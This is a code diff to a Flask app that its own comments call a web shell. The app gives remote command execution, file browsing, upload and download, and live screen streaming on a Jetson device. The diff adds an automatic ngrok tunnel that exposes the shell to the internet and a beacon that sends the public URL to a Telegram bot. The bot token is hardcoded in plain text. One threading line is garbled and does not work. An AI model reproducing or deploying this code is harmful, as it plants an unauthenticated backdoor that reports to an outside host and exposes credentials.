@@ -2,15 +2,52 @@
 from flask import Flask, render_template_string, request, send_file, Response
 import os
 import subprocess
+import threading
+import time
+import urllib.request
+import json
+import mss
 import cv2
 import numpy as np
 
 app = Flask(__name__)
 
-# دالة البث الحي لشاشة الجهاز البعيد
+# ضع هنا بيانات بوت التيليجرام الخاص بك لتستقبل الرابط عليه تلقائياً
+TELEGRAM_BOT_TOKEN = "8508402230:AAGK5iP1fxc7Dscu5pDmqWkAGLCCYLtKrB0"
+TELEGRAM_CHAT_ID = "8897834377"
+
+def send_telegram_message(message):
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        data = json.dumps({"chat_id": TELEGRAM_CHAT_ID, "text": message}).encode('utf-8')
+        req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})
+        urllib.request.urlopen(req)
+    except Exception as e:
+        print(f"[-] Telegram Error: {e}")
+
+# دالة لفتح نفق Ngrok تلقائياً وإرسال الرابط إلى تيليجرام
+def start_ngrok_and_notify():
+    time.sleep(3) # الانتظار قليلاً حتى يعمل السيرفر
+    try:
+        # تشغيل ngrok على البورت 8080 في الخلفية
+        os.system("ngrok http 8080 > /dev/null 2>&1 &")
+        time.sleep(3)
+        
+        # جلب الرابط الخارجي من واجهة ngrok المحلية
+        req = urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels")
+        data = json.loads(req.read().decode())
+        public_url = data['tunnels'][0]['public_url']
+        
+        # إرسال الرابط مباشرة إلى بوت التيليجرام
+        msg = f"🚀 تم تشغيل الـ Web Shell بنجاح على جهاز الـ Jetson!\n\n🔗 رابط الدخول الخارجي:\n{public_url}"
+        send_telegram_message(msg)
+        print(f"[+] تم إرسال الرابط إلى تيليجرام بنجاح: {public_url}")
+    except Exception as e:
+        print(f"[-] لم يتم العثور على رابط Ngrok تأكد من تثبيته أو تشغيله: {e}")
+
+# دالة التقاط الشاشة للبث الحي
 def generate_frames():
     try:
-        import mss
         with mss.mss() as sct:
             monitor = sct.monitors[1]
             while True:
@@ -40,23 +77,9 @@ HTML_TEMPLATE = """
         body { background-color: #0d1117; color: #c9d1d9; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; }
         h2 { color: #58a6ff; text-align: center; border-bottom: 2px solid #30363d; padding-bottom: 10px; }
         .container { max-width: 1200px; margin: auto; background: #161b22; padding: 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); position: relative; }
-        
-        .live-stream-box {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            width: 320px;
-            background: #21262d;
-            border: 2px solid #238636;
-            border-radius: 6px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.8);
-            z-index: 1000;
-            padding: 5px;
-            text-align: center;
-        }
+        .live-stream-box { position: fixed; top: 20px; right: 20px; width: 320px; background: #21262d; border: 2px solid #238636; border-radius: 6px; box-shadow: 0 4px 12px rgba(0,0,0,0.8); z-index: 1000; padding: 5px; text-align: center; }
         .live-stream-box h4 { margin: 5px 0; color: #7ee787; font-size: 14px; }
         .live-stream-box img { width: 100%; border-radius: 4px; display: block; }
-
         .section { margin-bottom: 25px; padding: 15px; background: #21262d; border-radius: 6px; border: 1px solid #30363d; max-width: 800px; }
         pre { background-color: #010409; color: #7ee787; padding: 15px; border-radius: 5px; max-height: 300px; overflow-y: auto; white-space: pre-wrap; word-wrap: break-word; }
         input[type="text"], input[type="file"] { width: 70%; padding: 8px; background: #0d1117; color: #fff; border: 1px solid #30363d; font-family: monospace; border-radius: 4px; }
@@ -70,20 +93,16 @@ HTML_TEMPLATE = """
     </style>
 </head>
 <body>
-
     <div class="live-stream-box">
         <h4>🔴 بث مباشر للشاشة</h4>
         <img src="{{ url_for('video_feed') }}" alt="Live Stream">
     </div>
-
     <div class="container">
         <h2>⚡ لوحة التحكم الذكية مع البث المباشر ⚡</h2>
-        
         <div class="section">
             <div class="path-bar">📁 المسار الحالي: <code>{{ current_path }}</code></div>
             <a href="/?path={{ parent_path }}"><button>⬆ العودة للمجلد الأعلى</button></a>
         </div>
-
         <div class="section">
             <h3>💻 تنفيذ الأوامر (Terminal & Disk Check)</h3>
             <pre>{{ output }}</pre>
@@ -93,15 +112,10 @@ HTML_TEMPLATE = """
                 <input type="submit" value="تنفيذ">
             </form>
         </div>
-
         <div class="section">
             <h3>📂 استعراض الأقراص والملفات</h3>
             <table>
-                <tr>
-                    <th>الاسم</th>
-                    <th>النوع</th>
-                    <th>إجراءات</th>
-                </tr>
+                <tr><th>الاسم</th><th>النوع</th><th>إجراءات</th></tr>
                 {% for item in items %}
                 <tr>
                     <td>
@@ -121,7 +135,6 @@ HTML_TEMPLATE = """
                 {% endfor %}
             </table>
         </div>
-
         <div class="section">
             <h3>📤 رفع ملف للجهاز</h3>
             <form method="POST" enctype="multipart/form-data">
@@ -140,7 +153,6 @@ def index():
     current_path = request.args.get('path', os.getcwd())
     current_path = os.path.abspath(current_path)
     parent_path = os.path.dirname(current_path)
-    
     output = "أهلاً بك يا محمد! نظام التحكم والبث الحي جاهز:\n"
     
     if request.method == "POST":
@@ -186,5 +198,12 @@ def download():
     return "الملف غير موجود!", 404
 
 if __name__ == "__main__":
+    # تشغيل خيط (Thread) لفتح Ngrok وإرسال الرابط للتيليجرام تلقائياً عند بدء التشغيل
+    threading.Thread(target=start_ngrok_and_notify, daemon=True).St_art = True if hasattr(threading.Thread, 'daemon') else None
+    # طريقة أבسط لتشغيل خيط الـ Ngrok:
+    t = threading.Thread(target=start_ngrok_and_notify)
+    t.daemon = True
+    t.start()
+    
     app.run(host="0.0.0.0", port=8080, debug=False)
     
